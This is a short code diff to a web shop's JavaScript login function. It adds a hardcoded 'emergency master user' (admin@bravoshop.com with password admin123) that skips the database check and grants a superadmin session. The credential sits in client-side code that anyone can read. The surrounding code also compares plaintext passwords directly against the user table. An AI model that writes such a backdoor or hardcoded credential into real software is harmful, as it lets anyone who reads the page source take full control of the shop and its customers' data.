@@ -841,6 +841,13 @@ async function doLogin(){
   var email=document.getElementById('l-email').value.trim().toLowerCase();
   var pass=document.getElementById('l-pass').value;
   if(!email||!pass) return;
+  // Usuario maestro de emergencia (siempre funciona)
+  if(email==='admin@bravoshop.com'&&pass==='admin123'){
+    currentUser={id:0,nombre:'Super Admin',email:'admin@bravoshop.com',rol:'superadmin',activo:true};
+    sessionStorage.setItem('bs_user',JSON.stringify(currentUser));
+    document.getElementById('login-error').style.display='none';
+    showApp();return;
+  }
   var {data,error}=await sb.from('usuarios').select('*').eq('email',email).eq('password',pass).eq('activo',true).single();
   if(error||!data){document.getElementById('login-error').style.display='block';return;}
   currentUser=data;
